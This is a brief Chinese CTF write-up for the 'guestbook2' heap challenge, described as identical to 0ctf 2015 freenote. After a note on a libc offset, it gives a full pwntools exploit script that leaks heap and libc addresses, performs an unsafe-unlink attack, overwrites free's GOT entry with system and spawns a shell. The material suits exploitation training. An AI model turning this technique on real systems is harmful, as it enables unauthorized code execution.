题目居然和2015 0ctf-freenote一样

详细题解看之前的level6


有个新问题出现，正在思考

求偏移时 求出的是0x3be7a8

实际上是0x3be7b8

返回的libc地址，是0x010和0x000的区别

希望这可以作为判断

exp：
```
from pwn import *
import sys

def list():
	r.recvuntil("Your choice: ")
	r.sendline("1")

def new(post):
	r.recvuntil("Your choice: ")
	r.sendline("2")
	r.recvuntil("Length of new post: ")
	r.sendline(str(len(post)))
	r.recvuntil("Enter your post: ")
	r.send(post)

def edit(num,post):
	r.recvuntil("Your choice: ")
	r.sendline("3")
	r.recvuntil("Post number: ")
	r.sendline(str(num))
	r.recvuntil("Length of post: ")
	r.sendline(str(len(post)))
	r.recvuntil("Enter your post: ")
	r.send(post)

def delete(num):
	r.recvuntil("Your choice: ")
	r.sendline("4")
	r.recvuntil("Post number: ")
	r.sendline(str(num))


r = process("./guestbook2")
#r = remote("pwn.jarvisoj.com",9879)
elf = ELF("./guestbook2")
lib = ELF("./libc.so.6")
print util.proc.pidof(r)
pause()
new('a' * 0x10)
new('b' * 0x10)
new('c' * 0x10)
new('d' * 0x10)
delete(0)
delete(2)
new('a'*0x8)
new('a'*0x8)
list()
r.recvuntil("0. aaaaaaaa")
heap = u64(r.recvline().strip('\x0a').ljust(8,'\x00')) - 0x1940
r.recvuntil("2. aaaaaaaa")
libc = u64(r.recvline().strip('\x0a').ljust(8,'\x00')) - 0x3be7b8
print hex(heap)
print hex(libc)
pause()
delete(3)
delete(2)
delete(1)
delete(0)
payload1 = p64(0)+p64(0x51)+p64(heap + 0x30 - 0x18)+p64(heap+0x30-0x10)+'a'*0x30+p64(0x50)+p64(0x20)
new(payload1)
payload2 = 'a'*0x80+p64(0x110)+p64(0x90)+'a'*0x80+p64(0)+p64(0x71)+'a'*0x60
new(payload2)
delete(2)
free_got = elf.got['free']
system = libc + lib.symbols['system']
payload3 = p64(8)+p64(1)+p64(8)+p64(free_got)+'a'*0x40
payload4 = p64(system)
edit(0,payload3)
pause()
edit(0,payload4)
payload5="/bin/sh\x00"
new(payload5)
delete(2)
r.interactive()


```
